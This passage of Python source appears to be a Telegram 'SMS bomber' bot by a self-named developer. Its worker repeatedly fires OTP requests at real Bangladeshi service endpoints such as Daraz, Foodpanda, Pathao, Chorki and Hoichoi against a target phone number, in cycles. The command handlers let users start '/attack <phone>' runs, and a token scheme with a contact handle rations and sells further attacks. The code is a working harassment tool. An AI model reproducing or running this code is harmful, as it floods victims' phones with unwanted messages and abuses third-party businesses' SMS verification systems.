                cycle_failed += 1
                failed += 1
                status_text = "[Binge] ✗ Error"
            
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                'chat_id': chat_id,
                'text': status_text
            })

            # 18. Doctime (two-step)
            try:
                url_doctime_hash = "https://api.doctime.net/api/hashing/status"
                params_doctime = {
                    "country_calling_code": "88",
                    "contact_no": f"0{clean_number}"
                }
                headers_doctime = {
                    'accept': 'application/json',
                    'origin': 'https://doctime.com.bd',
                    'platform': 'Web',
                    'referer': 'https://doctime.com.bd/',
                    'user-agent': 'Mozilla/5.0'
                }
                res_hash = session.get(url_doctime_hash, params=params_doctime, headers=headers_doctime, timeout=5)
                
                if res_hash.status_code == 200:
                    url_doctime_auth = "https://api.doctime.net/api/v2/authenticate"
                    data_doctime = {
                        "country_calling_code": "88",
                        "contact_no": f"0{clean_number}",
                        "timestamp": int(time.time())
                    }
                    res = session.post(url_doctime_auth, json=data_doctime, headers=headers_doctime, timeout=5)
                    if res.status_code in [200, 201, 202]:
                        cycle_success += 1
                        success += 1
                        status_text = f"[Doctime] ✓ {res.status_code}"
                    else:
                        cycle_failed += 1
                        failed += 1
                        status_text = f"[Doctime] ? {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Doctime] Hash failed ({res_hash.status_code})"
            except Exception as e:
                cycle_failed += 1
                failed += 1
                status_text = "[Doctime] ✗ Failed"

            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                'chat_id': chat_id,
                'text': status_text
            })

            # 19. Paragon Food
            try:
                url_paragon = "https://www.paragonfood.com.bd/Customer/SendOTP"
                headers_paragon = {
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://www.paragonfood.com.bd',
                    'referer': 'https://www.paragonfood.com.bd/register?returnUrl=%2F',
                    'user-agent': 'Mozilla/5.0',
                    'x-requested-with': 'XMLHttpRequest'
                }
                token = "CfDJ8HeewtE0hu5IlLYyJTdySwrbUjWs3J9yeY5XFVUJ3SVVDnVwinULjLHcTrbOV00niM_sO7G6-YTBpphHA3BYJt4OvQ1Ts75DaNH_GnaORJRG4SpxBxDEm2niSViRjdqgYnuIJk8E9hdDEgpvnxqX7pA"
                data_paragon = f"phoneNumber={clean_number}&otpTypeId=1&__RequestVerificationToken={token}"
                res = session.post(url_paragon, data=data_paragon, headers=headers_paragon, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[ParagonFood] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[ParagonFood] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[ParagonFood] ✗ Failed"
                })

            # 20. Apex
            try:
                url_apex = "https://api.apex4u.com/api/auth/login"
                headers_apex = {
                    'accept': 'application/json, text/plain, */*',
                    'content-type': 'application/json',
                    'origin': 'https://apex4u.com',
                    'referer': 'https://apex4u.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_apex = {"phoneNumber": clean_number}
                res = session.post(url_apex, json=data_apex, headers=headers_apex, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Apex] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Apex] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Apex] ✗ Failed"
                })

            # 21. Binge API
            try:
                url_binge_api = f"https://web-api.binge.buzz/api/v3/otp/send/+88{clean_number}"
                headers_binge_api = {
                    'Device-Type': 'web',
                    'User-Agent': 'Mozilla/5.0',
                    'Accept': 'application/json'
                }
                res = session.get(url_binge_api, headers=headers_binge_api, timeout=5)
                if res.status_code in [200, 201]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Binge API] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Binge API] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Binge API] ✗ Failed"
                })

            # 22. Hoichoi
            try:
                url_hoichoi = "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code"
                headers_hoichoi = {
                    'accept': '*/*',
                    'content-type': 'application/json',
                    'origin': 'https://www.hoichoi.tv',
                    'referer': 'https://www.hoichoi.tv/',
                    'user-agent': 'Mozilla/5.0',
                    'rid': 'anti-csrf',
                    'st-auth-mode': 'header'
                }
                data_hoichoi = {
                    "phoneNumber": f"+88{clean_number}",
                    "platform": "MOBILE_WEB"
                }
                res = session.post(url_hoichoi, json=data_hoichoi, headers=headers_hoichoi, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Hoichoi] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Hoichoi] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Hoichoi] ✗ Failed"
                })

            # 23. Chorki
            try:
                url_chorki = "https://api-dynamic.chorki.com/v2/auth/login"
                params_chorki = {"country": "BD", "platform": "web", "language": "en"}
                headers_chorki = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://www.chorki.com',
                    'referer': 'https://www.chorki.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_chorki = {"number": f"+88{clean_number}"}
                res = session.post(url_chorki, params=params_chorki, json=data_chorki, headers=headers_chorki, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Chorki] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Chorki] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Chorki] ✗ Failed"
                })

            # 24. Deeptoplay
            try:
                url_deepto = "https://api.deeptoplay.com/v2/auth/login"
                params_deepto = {"country": "BD", "platform": "web", "language": "en"}
                headers_deepto = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://www.deeptoplay.com',
                    'referer': 'https://www.deeptoplay.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_deepto = {"number": f"+88{clean_number}"}
                res = session.post(url_deepto, params=params_deepto, json=data_deepto, headers=headers_deepto, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Deeptoplay] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Deeptoplay] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Deeptoplay] ✗ Failed"
                })
            
            # 25. Foodpanda
            try:
                url_foodpanda = "https://www.foodpanda.com.bd/api/v1/login"
                headers_foodpanda = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://www.foodpanda.com.bd',
                    'referer': 'https://www.foodpanda.com.bd/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_foodpanda = {"phone": f"+88{clean_number}"}
                res = session.post(url_foodpanda, json=data_foodpanda, headers=headers_foodpanda, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Foodpanda] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Foodpanda] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Foodpanda] ✗ Failed"
                })
            
            # 26. Daraz
            try:
                url_daraz = "https://www.daraz.com.bd/api/login/otp"
                headers_daraz = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://www.daraz.com.bd',
                    'referer': 'https://www.daraz.com.bd/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_daraz = {"phone": clean_number}
                res = session.post(url_daraz, json=data_daraz, headers=headers_daraz, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Daraz] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Daraz] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Daraz] ✗ Failed"
                })
            
            # 27. Pathao
            try:
                url_pathao = "https://pathao.com/api/v2/login/otp"
                headers_pathao = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://pathao.com',
                    'referer': 'https://pathao.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_pathao = {"phone": f"+88{clean_number}"}
                res = session.post(url_pathao, json=data_pathao, headers=headers_pathao, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Pathao] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Pathao] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Pathao] ✗ Failed"
                })
            
            # Cycle summary
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': f"✅ **CYCLE {cycle_num} COMPLETED**\nSuccess: {cycle_success} | Failed: {cycle_failed}",
                    'parse_mode': 'Markdown'
                })
            except:
                pass
            time.sleep(2)

        # Attack completed
        if user_id in active_attacks:
            del active_attacks[user_id]
        
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                'chat_id': chat_id,
                'text': f"🎉 **ALL CYCLES COMPLETED**\nTotal Success: {success} | Total Failed: {failed}",
                'parse_mode': 'Markdown'
            })
        except:
            pass
        log_activity(f"Attack completed by {username} on {full_number}. Success: {success}, Failed: {failed}")

    except Exception as e:
        log_activity(f"Error in bombing worker: {e}")
        if user_id in active_attacks:
            del active_attacks[user_id]

# ==================== TELEGRAM COMMAND HANDLERS ====================
def get_reply_keyboard(user_id):
    """Get reply keyboard with commands based on user type"""
    is_super = user_id in super_users
    
    # Base commands for all users
    keyboard = [
        ["/start", "/attack", "/mytokens"],
        ["/apply", "/stop"]
    ]
    
    # Add admin commands if super user
    if is_super:
        keyboard.append(["/logout", "/listusers"])
        keyboard.append(["/grant", "/revoke"])
    
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    track_user(user.id, user.username, user.first_name)
    
    is_super = user.id in super_users
    user_id_str = str(user.id)
    token_balance = user_tokens.get(user_id_str, {}).get("extra_tokens", 0)
    free_left = user_tokens.get(user_id_str, {}).get("free_uses_left", 0)
    
    msg = f"👋 Welcome {user.first_name}!\n\n"
    msg += f"🔥 **Developer: Mr MorningStar**\n\n"
    msg += f"🎟️ **Your Status:**\n"
    if is_super:
        msg += "✅ Super User (Unlimited Access)\n"
    else:
        msg += f"One-time Free Uses Left: {free_left}/3\n"
        msg += f"Extra Tokens: {token_balance}\n"
    
    msg += f"\n📋 **All Commands:**\n"
    msg += f"/start - Show this message\n"
    msg += f"/attack <phone> - Start bombing\n"
    msg += f"/stop - Stop current attack\n"
    msg += f"/mytokens - Check token balance\n"
    msg += f"/apply <reason> - Request extra tokens\n"
    if is_super:
        msg += f"\n🔑 **Admin Commands:**\n"
        msg += f"/logout - Logout from admin\n"
        msg += f"/grant <user_id> <amount> - Add tokens\n"
        msg += f"/revoke <user_id> <amount> - Remove tokens\n"
    else:
        msg += f"\n🔑 **Admin Login:**\n"
       
    
    msg += f"\n💡 **Token Rules:**\n"
    msg += f"- You get 3 one-time free uses (never resets)\n"
    msg += f"- After free uses end, use extra tokens\n"
    msg += f"- Tokens don't expire until used\n"
    msg += f"- Need tokens? Contact @morningstarspice\n"
    
    reply_markup = get_reply_keyboard(user.id)
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if len(args) != 1 or args[0] != ADMIN_PASS:
        await update.message.reply_text("❌ Invalid admin password. Use /admin <password>")
        return
    
    if user_id not in super_users:
        super_users.append(user_id)
        save_data()
        await update.message.reply_text("✅ You are now logged in as Admin (Super User) with unlimited access.")
        log_activity(f"Admin logged in: {user_id}")
    else:
        await update.message.reply_text("✅ You are already logged in as Admin.")

async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in super_users:
        super_users.remove(user_id)
        save_data()
        reply_markup = get_reply_keyboard(user_id)
        await update.message.reply_text(
            "✅ You have been logged out from Admin (Super User) privileges.",
            reply_markup=reply_markup
        )
        log_activity(f"Admin logged out: {user_id}")
    else:
        await update.message.reply_text("❌ You are not logged in as Admin.")

async def apply_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_id_str = str(user_id)
    reason = " ".join(context.args) if context.args else "No reason provided"
    
    if not super_users:
        await update.message.reply_text("❌ No admin online. Try again later.")
        return
    
    # Notify all admins
    for admin_id in super_users:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=f"📥 **Token Application**\nUser: {update.effective_user.first_name} (@{update.effective_user.username})\nID: {user_id}\nReason: {reason}\n\nUse /grant {user_id} <amount> to approve."
            )
        except:
            pass
    
    await update.message.reply_text("✅ Your token application has been sent to the admin. You will be notified when approved.")

async def grant_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in super_users:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    args = context.args
    if len(args) != 2:
        await update.message.reply_text("Usage: /grant <user_id> <amount>")
        return
    
    target_user_id = args[0]
    try:
        amount = int(args[1])
        if amount <= 0:
            raise ValueError
    except:
        await update.message.reply_text("Invalid amount. Must be a positive integer.")
        return
    
    # Initialize target user's token data if not exists
    if target_user_id not in user_tokens:
        user_tokens[target_user_id] = {
            "extra_tokens": 0,
            "daily_free_used": 0,
            "last_daily_reset": datetime.now().strftime("%Y-%m-%d")
        }
    
    user_tokens[target_user_id]["extra_tokens"] += amount
    save_data()
    
    # Notify target user with clear message
    try:
        await context.bot.send_message(
            chat_id=int(target_user_id),
            text=f"🎉 **TOKEN GRANTED!**\n\nYou just received **{amount} extra tokens** from admin!\n\nYour new token balance: **{user_tokens[target_user_id]['extra_tokens']}**\n\nUse /attack to start bombing!",
            parse_mode='Markdown'
        )
    except:
        pass
    
    await update.message.reply_text(f"✅ Granted {amount} tokens to user {target_user_id}. New balance: {user_tokens[target_user_id]['extra_tokens']}")

async def revoke_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in super_users:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    args = context.args
    if len(args) != 2:
        await update.message.reply_text("Usage: /revoke <user_id> <amount>")
        return
    
    target_user_id = args[0]
    try:
        amount = int(args[1])
        if amount <= 0:
            raise ValueError
    except:
        await update.message.reply_text("Invalid amount. Must be a positive integer.")
        return
    
    if target_user_id not in user_tokens:
        await update.message.reply_text("User has no token data.")
        return
    
    user_tokens[target_user_id]["extra_tokens"] = max(0, user_tokens[target_user_id]["extra_tokens"] - amount)
    save_data()
    
    # Notify target user
    try:
        await context.bot.send_message(
            chat_id=int(target_user_id),
            text=f"⚠️ Admin revoked {amount} tokens from your balance. New balance: {user_tokens[target_user_id]['extra_tokens']}"
        )
    except:
        pass
    
    await update.message.reply_text(f"✅ Revoked {amount} tokens from user {target_user_id}. New balance: {user_tokens[target_user_id]['extra_tokens']}")

async def mytokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_id_str = str(user_id)
    
    if user_id_str not in user_tokens:
        user_tokens[user_id_str] = {
            "extra_tokens": 0,
            "free_uses_left": 3
        }
        save_data()
    
    user_token = user_tokens[user_id_str]
    free_left = user_token.get("free_uses_left", 0)
    extra_tokens = user_token.get("extra_tokens", 0)
    is_super = user_id in super_users
    
    msg = f"🎟️ **Your Token Status**\n"
    if is_super:
        msg += "✅ Super User (Unlimited Access)\n"
    else:
        msg += f"One-time Free Uses Left: {free_left}/3\n"
        msg += f"Extra Tokens: {extra_tokens}\n"
        msg += f"Total Remaining Uses: {free_left + extra_tokens}\n"
        if free_left + extra_tokens == 0:
            msg += f"\n💡 Need tokens? Contact @morningstarspice"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def listusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in super_users:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if not bot_users:
        await update.message.reply_text("📋 No users found.")
        return
    
    msg = f"📋 **USER LIST (Admin View)**\n\n"
    msg += f"Total Users: {len(bot_users)}\n"
    msg += f"Super Users: {len(super_users)}\n\n"
    
    for uid, data in bot_users.items():
        is_super = "⭐" if int(uid) in super_users else "👤"
        token_info = user_tokens.get(uid, {})
        free_left = token_info.get("free_uses_left", 0)
        extra_tokens = token_info.get("extra_tokens", 0)
        total_uses = free_left + extra_tokens
        
        msg += f"{is_super} **{data.get('first_name', 'Unknown')}**\n"
        msg += f"   ID: `{uid}`\n"
        msg += f"   Username: @{data.get('username', 'N/A')}\n"
        msg += f"   Free Left: {free_left}/3 | Extra: {extra_tokens} | Total: {total_uses}\n"
        msg += f"   Attacks: {data.get('total_attacks', 0)}\n\n"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    chat_id = update.effective_chat.id
    
    # Check if attack already running
    if user_id in active_attacks:
        await update.message.reply_text("❌ You already have an active attack. Use /stop to stop it.")
        return
    
    # Check arguments
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /attack <phone_number>\nExample: /attack 01712345678")
        return
    
    phone_number = context.args[0]
    full_number, clean_number = format_phone_number(phone_number)
    raw_number = clean_number
    
    # Check if user can attack
    can_attack_result, message = can_attack(user_id)
    if not can_attack_result:
        await update.message.reply_text(f"❌ {message}")
        return
    
    # Start attack
    active_attacks[user_id] = {'stop': False, 'chat_id': chat_id}
    increment_attack_count(user_id)
    
    await update.message.reply_text(f"🚀 **Attack started on {full_number}**\n{message}", parse_mode='Markdown')
    
    # Start bombing worker in thread
    threading.Thread(
        target=bombing_worker,
        args=(chat_id, full_number, clean_number, raw_number, user_id, user.username or user.first_name),
        daemon=True
    ).start()

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚠️ **Old command detected!**\n\n"
        "Use `/attack <phone>` instead of `/bomb`\n"
        "Example: `/attack 01712345678`\n\n"
        "The `/bomb` command is outdated. Please use `/attack` from now on.",
        parse_mode='Markdown'
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_attacks:
        active_attacks[user_id]['stop'] = True
        await update.message.reply_text("🛑 Stopping your attack...")
    else:
        await update.message.reply_text("❌ You have no active attacks.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if query.data == f'stop_{user_id}':
        if user_id in active_attacks:
            active_attacks[user_id]['stop'] = True
            await query.answer("🛑 Attack stopping...")
            await query.edit_message_text("🛑 Attack stopped by user.")
        else:
            await query.answer("❌ No active attack.")

def main():
    load_data()
    clear_screen()
    
    # Start terminal command thread
    threading.Thread(target=terminal_commands, daemon=True).start()
    
    # Start Flask server for health checks
    try:
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
        print("Flask health check server running on port 5000")
    except Exception as e:
        print(f"Warning: Could not start Flask server: {e}")
    
    # Fix Python 3.14 compatibility - remove __slots__ from Updater class
    try:
        from telegram.ext._updater import Updater
        import telegram.ext._updater as updater_module
        import types
        
        # Create a new class without __slots__ by copying all attributes
        class_dict = {}
        for key, value in Updater.__dict__.items():
            if key != '__slots__':
                class_dict[key] = value
        
        # Create new class with same name and bases, but no __slots__
        NewUpdater = types.new_class(
            'Updater',
            Updater.__bases__,
            exec_body=lambda ns: ns.update(class_dict)
        )
        
        # Copy all class attributes that might have been missed
        for attr in dir(Updater):
            if not attr.startswith('__') or attr in ('__init__', '__doc__', '__module__'):
                try:
                    setattr(NewUpdater, attr, getattr(Updater, attr))
                except:
                    pass
        
        # Replace the Updater class in the module
        updater_module.Updater = NewUpdater
        print("✓ Removed __slots__ from Updater class for Python 3.14 compatibility")
    except Exception as e:
        print(f"Warning: Could not patch Updater: {e}")
        print("Trying alternative method...")
        try:
            # Alternative: edit the __dict__ directly
            from telegram.ext._updater import Updater
            if '__slots__' in Updater.__dict__:
                del Updater.__dict__['__slots__']
                print("✓ Deleted __slots__ from Updater.__dict__")
        except Exception as e2:
            print(f"Alternative method failed: {e2}")
    
    # Create Telegram application
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        print("✓ Telegram Application created successfully")
    except AttributeError as e:
        print("\n" + "="*60)
        print("ERROR: Telegram library compatibility issue!")
        print("="*60)
        print(f"Error: {e}")
        print("\nThis version of python-telegram-bot may not support Python 3.14.")
        print("Please downgrade to Python 3.12 or 3.11 for best compatibility.")
        sys.exit(1)
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("logout", logout_command))
    application.add_handler(CommandHandler("apply", apply_command))
    application.add_handler(CommandHandler("grant", grant_command))
    application.add_handler(CommandHandler("revoke", revoke_command))
    application.add_handler(CommandHandler("mytokens", mytokens_command))
    application.add_handler(CommandHandler("listusers", listusers_command))  # Admin only
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("bomb", bomb_command))  # Redirect old /bomb command
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    print("="*60)
    print("          BOT IS NOW RUNNING")
    print("="*60)
    
    # Start polling
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
